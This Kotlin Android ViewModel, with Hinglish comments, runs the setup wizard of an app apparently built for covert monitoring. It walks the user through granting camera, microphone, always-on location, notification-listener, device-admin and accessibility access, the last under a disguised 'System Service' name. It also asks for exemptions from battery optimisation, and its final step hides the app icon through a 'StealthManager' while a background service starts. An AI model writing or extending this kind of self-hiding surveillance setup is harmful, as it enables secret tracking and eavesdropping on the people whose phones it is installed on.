package com.guard.screen.ui.viewmodel

import android.content.Context
import androidx.lifecycle.ViewModel
import com.guard.screen.core.Constants
import com.guard.screen.core.Logger
import com.guard.screen.security.StealthManager
import dagger.hilt.android.lifecycle.HiltViewModel
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import javax.inject.Inject

data class SetupUiState(
    val currentStep: Int = 0,
    val totalSteps: Int = 8,
    val title: String = "",
    val description: String = "",
    val actionLabel: String = "Open Settings",
    val isCurrentStepComplete: Boolean = false,
    val isLastStep: Boolean = false
) {
    val progress: Float
        get() = (currentStep + 1).toFloat() / totalSteps.toFloat()
}

@HiltViewModel
class SetupViewModel @Inject constructor(
    @ApplicationContext private val context: Context,
    private val stealthManager: StealthManager
) : ViewModel() {

    private val _uiState = MutableStateFlow(SetupUiState())
    val uiState: StateFlow<SetupUiState> = _uiState.asStateFlow()

    init {
        updateStep()
    }

    fun nextStep() {
        if (_uiState.value.currentStep < _uiState.value.totalSteps - 1) {
            _uiState.value = _uiState.value.copy(currentStep = _uiState.value.currentStep + 1)
            updateStep()
        }
    }

    fun performStepAction() {
        // Current step ke hisaab se settings kholo
        try {
            val action = _uiState.value.currentStep
            when (action) {
                0 -> openRuntimePermissions()
                1 -> openDeviceAdmin()
                2 -> openBatterySettings()
                3 -> openAutostartSettings()
                4 -> openAccessibility()
                5 -> openNotificationAccess()
                6 -> openBackgroundLocation()
                7 -> {
                    finishSetup()
                    return
                }
            }
            // Check ho gaya, next step pe jao
            nextStep()
        } catch (e: Exception) {
            Logger.e("SetupVM", "Step action failed", e)
        }
    }

    fun finishSetup() {
        try {
            val prefs = context.getSharedPreferences(Constants.PREFS_NAME, Context.MODE_PRIVATE)
            prefs.edit().putBoolean(Constants.KEY_SETUP_DONE, true).apply()
            stealthManager.hideIcon()
        } catch (e: Exception) {
            Logger.e("SetupVM", "finishSetup failed", e)
        }
    }

    private fun updateStep() {
        val step = _uiState.value.currentStep
        val (title, desc, actionLabel, isComplete) = when (step) {
            0 -> StepInfo(
                "Step 1: Grant Permissions",
                "Grant Camera, Microphone, Location, and Notification permissions.",
                "Grant Permissions",
                false
            )
            1 -> StepInfo(
                "Step 2: Enable Device Admin",
                "Required for remote lock and wipe features.",
                "Enable Admin",
                false
            )
            2 -> StepInfo(
                "Step 3: Disable Battery Optimization",
                "Allows the service to run in the background without being killed.",
                "Open Battery Settings",
                false
            )
            3 -> StepInfo(
                "Step 4: Enable Autostart",
                "ColorOS/Realme UI: Allow the app to auto-start. Settings → Apps → App Management.",
                "Open App Settings",
                false
            )
            4 -> StepInfo(
                "Step 5: Enable Accessibility",
                "Settings → Accessibility → Downloaded Apps → System Service.",
                "Open Accessibility",
                false
            )
            5 -> StepInfo(
                "Step 6: Notification Access",
                "Settings → Apps → Special Access → Notification Access.",
                "Open Notification Settings",
                false
            )
            6 -> StepInfo(
                "Step 7: Background Location",
                "Set location permission to 'Allow all the time'.",
                "Open App Info",
                false
            )
            7 -> StepInfo(
                "Step 8: Hide Icon & Start",
                "App icon will hide and background service will start.",
                "Hide & Finish",
                false
            )
            else -> StepInfo("Setup", "Setup complete.", "Done", true)
        }

        _uiState.value = _uiState.value.copy(
            title = title,
            description = desc,
            actionLabel = actionLabel,
            isCurrentStepComplete = isComplete,
            isLastStep = step == _uiState.value.totalSteps - 1
        )
    }

    private fun openRuntimePermissions() {
        // TODO: PermissionActivity kholo
    }

    private fun openDeviceAdmin() {
        try {
            val intent = android.content.Intent(
                android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN
            )
            val adminComp = android.content.ComponentName(
                context,
                com.guard.screen.receivers.AdminReceiver::class.java
            )
            intent.putExtra(
                android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                adminComp
            )
            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(intent)
        } catch (_: Exception) {}
    }

    private fun openBatterySettings() {
        try {
            val intent = android.content.Intent(
                android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
            ).apply {
                data = android.net.Uri.parse("package:${context.packageName}")
                addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
        } catch (_: Exception) {}
    }

    private fun openAutostartSettings() {
        try {
            val intent = android.content.Intent(
                android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS
            ).apply {
                data = android.net.Uri.parse("package:${context.packageName}")
                addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
        } catch (_: Exception) {}
    }

    private fun openAccessibility() {
        try {
            val intent = android.content.Intent(
                android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS
            ).apply {
                addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
        } catch (_: Exception) {}
    }

    private fun openNotificationAccess() {
        try {
            val intent = android.content.Intent(
                "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"
            ).apply {
                addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
        } catch (_: Exception) {}
    }

    private fun openBackgroundLocation() {
        try {
            val intent = android.content.Intent(
                android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS
            ).apply {
                data = android.net.Uri.parse("package:${context.packageName}")
                addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
        } catch (_: Exception) {}
    }

    private data class StepInfo(
        val title: String,
        val description: String,
        val actionLabel: String,
        val isComplete: Boolean
    )
}
